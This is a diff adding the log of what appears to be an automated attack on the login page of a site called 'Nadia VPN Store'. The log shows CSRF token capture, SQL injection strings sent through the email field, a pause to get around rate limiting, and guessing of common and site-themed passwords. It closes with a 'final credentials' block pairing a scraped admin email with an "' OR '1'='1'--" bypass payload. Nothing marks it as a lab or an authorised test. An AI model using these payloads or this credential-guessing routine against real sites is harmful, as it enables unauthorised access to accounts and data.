@@ -1,0 +1,37 @@
+[*] Creating fresh session...
+CSRF: q23sPjccLoupwMXYluX2...
+
+[*] Testing payloads that pass email validation:
+  ✗ Email error: email'--
+  ✗ Email error: email' #
+  ✗ Email error: email' OR
+  ✗ Email error: email' OR full
+  ✗ Email error: email' OR commented
+  ✗ Email error: email'@
+  ✗ Email error: 'admin'@
+  ✗ Email error: admin'@'
+  ✗ Email error: 1' OR
+  ✗ Email error: x'--
+
+[*] Waiting 10s for rate limit reset...
+
+[*] Testing admin email + common passwords:
+  ✗ Email error: admin123
+  ✗ Email error: password
+  ✗ Email error: 123456
+  ✗ Email error: admin
+  ✗ Email error: nadia123
+  ✗ Email error: Nadia@2024
+  ? Other: nadiavpn
+  ? Other: nadia@vpn
+  ? Other: admin@nadia
+
+[*] SQLi with admin email...
+  Result: email
+  Text: globalLoading = false, 60000); }"> Nadia VPN Store window.serverToasts = [ { id: Date.now() + 5, message: "The email field must be a valid email address.", type: 'error' }, ]; tailwind.config = { dark
+
+=== FINAL CREDENTIALS ===
+📧 Admin email: nama@email.com
+   (ditemukan di halaman /contact)
+🔑 SQLi: nama@email.com' OR '1'='1'--
+🔑 Password: coba password di atas
